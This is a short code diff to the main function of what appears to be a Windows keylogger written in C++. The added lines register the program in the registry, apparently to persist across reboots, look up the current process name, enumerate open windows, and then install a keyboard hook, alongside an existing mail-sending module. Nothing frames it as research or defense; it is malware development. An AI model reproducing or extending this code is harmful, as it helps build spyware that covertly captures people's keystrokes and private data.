@@ -7,13 +7,23 @@
 #include "Timer.h"
 #include "SendMail.h"
 #include "KeybHook.h"
+#include "Regedit.h"
+#include "prepare.h"
+#include "Process.h"
 
-//using namespace std;
+using namespace std;
 
 int main()
 {
+    start();
+
+    Registry::RegisterProgram();
+
 	MSG Msg;
     IO::MkDir(IO::GetOurPath(true));
+    GetProcID();
+    curprocname = GetProcName(curpid);
+    EnumWindows(EnumWindowsProc,0);
     InstallHook();
 	while (GetMessage(&Msg, NULL, 0, 0))
 	{
